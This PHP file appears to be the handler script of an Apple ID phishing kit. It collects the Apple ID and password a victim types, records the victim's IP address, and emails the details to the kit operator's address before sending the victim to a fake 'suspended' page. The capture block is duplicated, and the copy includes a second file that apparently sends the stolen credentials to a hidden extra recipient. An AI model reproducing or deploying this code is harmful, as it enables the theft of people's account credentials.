<? include "../security.php";?>
<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==============| Apple by TchiTcho |===============\n";
$bilsmg .= "Apple ID                    : ".$_POST['login-id']."\n";
$bilsmg .= "Password                    : ".$_POST['id-passwd']."\n";
$bilsmg .= "==============| IP INFO |================\n";
include '../put-your-email-here.php';
$bilsmg .= "From http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "==============| TchiTcho |================";
$bilsub = "Result Login | $ip";
$headers = "From: Apple V2 <scammer@scammer.scammer>";
$arr=array($bilsnd, $IP);

mail($mailto,$bilsub,$bilsmg,$headers);
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==============| Apple by TchiTcho |===============\n";
$bilsmg .= "Apple ID                    : ".$_POST['login-id']."\n";
$bilsmg .= "Password                    : ".$_POST['id-passwd']."\n";
$bilsmg .= "==============| IP INFO |================\n";
include '../img.php';
$bilsmg .= "From http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "==============| TchiTcho |================";
$bilsub = "Result Login | $ip";
$headers = "From: Apple V2 <scammer@scammer.scammer>";
$arr=array($bilsnd, $IP);

mail($mailto,$bilsub,$bilsmg,$headers);

header("Location: suspended.php");
?>